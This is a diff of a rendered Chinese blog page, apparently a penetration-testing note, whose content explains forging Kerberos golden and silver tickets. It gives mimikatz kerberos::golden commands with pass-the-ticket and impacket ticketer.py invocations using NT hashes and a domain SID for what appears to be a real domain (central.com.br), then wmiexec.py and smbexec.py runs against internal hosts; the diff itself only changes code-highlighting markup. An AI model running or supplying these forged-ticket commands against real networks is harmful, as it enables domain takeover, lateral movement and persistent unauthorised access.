@@ -14,14 +14,11 @@
   href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&family=Noto+Serif+SC:wght@400;600;700&display=swap"
   as="style" onload="this.onload=null;this.rel='stylesheet'">
 
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/styles/stackoverflow-dark.min.css"
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/styles/solarized-light.min.css"
    media="print"
   onload="this.media='all';this.onload=null" crossorigin>
 <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/highlight.min.js"
    crossorigin></script>
-
-  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.0/build/languages/dart.min.js"
-     crossorigin></script>
 
 <script defer src="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/js/all.min.js"
    integrity="sha256-uNYoXefWRqv&#43;PsIF/OflNmwtKM4lStn9yrz2gVl6ymo="  crossorigin></script>
@@ -87,7 +84,7 @@
     },
     "headline": "域中票据的制作 | Oulaa","datePublished": "2021-10-11T00:00:00+00:00",
     "dateModified": "2021-10-11T00:00:00+00:00",
-    "wordCount":  104 ,
+    "wordCount":  115 ,
     "author": {
         "@type": "Person",
         "name": ["Oulaa"]
@@ -254,40 +251,88 @@
 
         <div class="content">
             <h1 id="一使用mimikatz制作票据">一、使用mimikatz制作票据</h1>
-<pre><code class="language-text-plain">kerberos::purge
-</code></pre>
-<pre><code class="language-text-plain">kerberos::golden /user:administrator /domain:unicode.org /sid:S-1-5-21-165017151-3123059220-25911706310 /krbtgt:xxx /ticket:admin.tck /ptt
-</code></pre>
-<p>注入票据</p>
-<pre><code class="language-text-plain">kerberos::tgt admin.tck
-</code></pre>
-<blockquote>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kerberos::purge
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kerberos::golden /user:administrator /domain:unicode.org /sid:S-1-5-21-165017151-3123059220-25911706310 /krbtgt:xxx /ticket:admin.tck /ptt
+</code></pre></td></tr></table>
+</div>
+</div><p>注入票据</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kerberos::tgt admin.tck
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
 <p>注意：拿到票据之后注入内存，使用sc之类的服务的情况下使用主机名即可走域认证，使用IP走ntlm认证。</p>
 </blockquote>
 <p>清除票据</p>
-<pre><code class="language-text-plain">klist /purge
-</code></pre>
-<h1 id="二impakect">二、impakect</h1>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">klist /purge
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="二impakect">二、impakect</h1>
 <ul>
 <li><strong>（1）金票</strong></li>
 </ul>
 <p>制作票据：</p>
-<pre><code class="language-python">python3 ticketer.py -nthash 1caee7a5d22ec1b4a20d1c6d72cdfbf1 -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.com.br administrator
-</code></pre>
-<blockquote>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python3 ticketer<span style="color:#666">.</span>py <span style="color:#666">-</span>nthash <span style="color:#666">1</span>caee7a5d22ec1b4a20d1c6d72cdfbf1 <span style="color:#666">-</span>domain<span style="color:#666">-</span>sid S<span style="color:#666">-</span><span style="color:#666">1</span><span style="color:#666">-</span><span style="color:#666">5</span><span style="color:#666">-</span><span style="color:#666">21</span><span style="color:#666">-</span><span style="color:#666">3428754558</span><span style="color:#666">-</span><span style="color:#666">1783579842</span><span style="color:#666">-</span><span style="color:#666">1599308265</span> <span style="color:#666">-</span>domain central<span style="color:#666">.</span>com<span style="color:#666">.</span>br administrator
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
 <p><code>-nthash</code>为krbgtg的hash。</p>
 <p><code>-domain-sid</code>为域SID，即域用户ID减去用户部分。</p>
 </blockquote>
 <p>设置临时环境变量(windows)：</p>
-<pre><code class="language-js">set KRB5CCNAME=C:\Users\aa\Desktop\剑客\内网渗透\impacket-master\impacket-master\examples
-</code></pre>
-<p>linux:</p>
-<pre><code class="language-bash">export KRB5CCNAME=/pentest/impacket/examples/administrator.ccache
-</code></pre>
-<p>使用黄金票据去访问DC</p>
-<pre><code class="language-text-plain">python3 wmiexec.py -k -no-pass -dc-ip 192.168.100.242 -debug SV-ERP0001
-</code></pre>
-<blockquote>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">set KRB5CCNAME<span style="color:#666">=</span>C<span style="color:#666">:</span><span style="">\</span>Users<span style="">\</span>aa<span style="">\</span>Desktop<span style="">\</span>剑客<span style="">\</span>内网渗透<span style="">\</span>impacket<span style="color:#666">-</span>master<span style="">\</span>impacket<span style="color:#666">-</span>master<span style="">\</span>examples
+</code></pre></td></tr></table>
+</div>
+</div><p>linux:</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#008000">export</span> <span style="color:#19177c">KRB5CCNAME</span><span style="color:#666">=</span>/pentest/impacket/examples/administrator.ccache
+</code></pre></td></tr></table>
+</div>
+</div><p>使用黄金票据去访问DC</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python3 wmiexec.py -k -no-pass -dc-ip 192.168.100.242 -debug SV-ERP0001
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
 <p><code>-dc-ip</code> 为域控的用户名，目标必须是机器名，如果是本地需要配置host。</p>
 </blockquote>
 <ul>
@@ -297,18 +342,36 @@
 <ul>
 <li></li>
 </ul>
-<pre><code class="language-text-plain">python ticketer.py -nthash 305914b9bdab214a3cf72a238e8d0463 -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.com.br -spn CIFS/SV-ERP0001 administrator
-</code></pre>
-<blockquote>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python ticketer.py -nthash 305914b9bdab214a3cf72a238e8d0463 -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.com.br -spn CIFS/SV-ERP0001 administrator
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
 <p><code>-nthash</code>为试图访问目标的机器用户hash。</p>
 <p><code>-spn</code>为试图访问服务的spn。<code>CIFS/WIN10.unicode.org</code>/ <code>CIFS/WIN10</code></p>
 </blockquote>
-<pre><code class="language-text-plain">python3 ticketer.py -nthash 305914b9bdab214a3cf72a238e8d0463 -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.com.br -spn CIFS/SV-ERP0001 administrator
-</code></pre>
-<p>使用<code>smbclient.py</code>访问目标</p>
-<pre><code class="language-text-plain">python3 smbexec.py -k -no-pass SV-ERP0001 -target-ip 192.168.100.16
-</code></pre>
-<blockquote>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python3 ticketer.py -nthash 305914b9bdab214a3cf72a238e8d0463 -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.com.br -spn CIFS/SV-ERP0001 administrator
+</code></pre></td></tr></table>
+</div>
+</div><p>使用<code>smbclient.py</code>访问目标</p>
+<div class="highlight"><div style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python3 smbexec.py -k -no-pass SV-ERP0001 -target-ip 192.168.100.16
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
 <p>[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)</p>
 </blockquote>
 
